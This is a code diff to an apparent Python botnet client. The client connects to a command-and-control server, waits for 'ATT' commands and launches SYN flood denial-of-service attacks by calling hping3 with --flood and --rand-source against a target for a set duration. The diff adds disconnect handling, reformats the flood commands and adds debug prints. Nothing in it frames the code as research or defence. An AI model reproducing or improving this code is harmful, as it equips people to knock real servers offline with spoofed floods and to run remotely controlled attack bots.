@@ -18,7 +18,15 @@ def connect_to_cnc():
 def listen(sock):
     while True:
         try:
+            if sock.fileno()==-1:
+                print("Closed connection with cnc")
+                break
+
             data = sock.recv(1024).decode().strip()
+
+            if not data: 
+                print("connection closed by the cnc")
+                break
 
             if data.startswith("ATT"):
                 parts = data.split()
@@ -54,6 +62,7 @@ def attack(target,type_att, duration):
     # hping 3 -S --flood --rand-source -p 80 {target}
 
     if type_att == "1":
+        print(f"not rand duration {duration}")
             
         hping_cmd = [
             "sudo", "hping3",
@@ -62,18 +71,24 @@ def attack(target,type_att, duration):
             "--flood",
             target
         ]
-        
+
         process = subprocess.Popen(hping_cmd)
     elif type_att == "2":
+        print(f"rand attack duration {duration}")
         hping_cmd = [
-                "sudo", "hping3", "-S","-p","80","--flood","--rand-source",target
-                ]
-            
-    
-        print(f"Running: {' '.join(hping_cmd)}")
-        # Start the process
+            "sudo", "hping3",
+            "-S",
+            "-p", "80", 
+            "--flood",
+            "--rand-source",
+            target
+        ]
         process = subprocess.Popen(hping_cmd)
-    
+    else:
+        print("not valid attack type")
+
+
+    print(f"terminating {process}")
     # Run for <60 seconds
     time.sleep(duration)
     
